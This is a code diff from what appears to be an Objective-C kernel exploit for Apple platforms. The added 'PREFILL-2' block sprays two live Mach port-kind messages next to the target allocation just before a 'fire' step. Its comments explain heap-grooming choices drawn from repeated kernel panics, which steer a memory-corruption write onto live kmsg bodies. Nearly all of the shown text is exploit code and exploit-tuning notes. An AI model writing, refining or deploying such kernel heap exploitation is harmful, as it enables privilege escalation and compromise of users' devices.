@@ -48,7 +48,7 @@
 #import <sys/socket.h>
 #import <netinet/in.h>
 
-#define P073_BUILD @"p073-second-table-v7i-hold-window"
+#define P073_BUILD @"p073-second-table-v7j-prefill2"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -731,6 +731,34 @@ static NSURL *p073_model_url(NSString *name) {
         p073_log(@"[+] punched %u/%u holes — magazine LIFO armed for two tables", punched, nHoles);
     }
 
+    /* ---- v7j PREFILL-2: two LIVE port-kind kmsgs allocated immediately
+       before the fire. Root cause (6 panic packs 21:55-22:56, v7i-proven):
+       the 254 record-area pops the 3072 chunk whose ADDRESS-neighbor is the
+       freelist chunk freed by the tap's own earlier small-predict teardown
+       -> freed-lane MAF every boot (off:0, {sid,0xc0} at victim+0). Live-lane
+       boots recv-measured mutated=64 landings instead. The prefill fills the
+       immediate address-neighborhood with LIVE port-kind chunks so the
+       record stream (landing L per boot: off:0/+0x10/+0x64 measured) lands
+       on LIVE kmsg bodies; the phase law collects from the existing
+       record[0] dumps. p088-v18 mapped-neighbor prefill law, ported. */
+    {
+        p073_held_t *v7jPrefill = calloc(2, sizeof(p073_held_t));
+        uint32_t v7jN = 0;
+        if (v7jPrefill) {
+            for (uint32_t i = 0; i < 2; i++) {
+                mach_port_t p = p073_make_port();
+                if (p == MACH_PORT_NULL) break;
+                v7jPrefill[v7jN].port = p;
+                v7jPrefill[v7jN].index = 0x4000u | i;
+                v7jPrefill[v7jN].alive = YES;
+                if (!p073_send_portkind(p, v7jPrefill[v7jN].index) &&
+                    !p073_send_simple(p, v7jPrefill[v7jN].index)) break;
+                v7jN++;
+            }
+            p073_log(@"[v7j] prefill-2: %u live neighbors before fire (0x4000 band)",
+                     v7jN);
+        }
+    }
     /* ---- FIRE: small table first (in-flight), then 254 addchain ---- */
     int pred254Attempts = 0;             /* v3 retry bookkeeping (verdict reads this) */
     BOOL pred254Fired = NO;
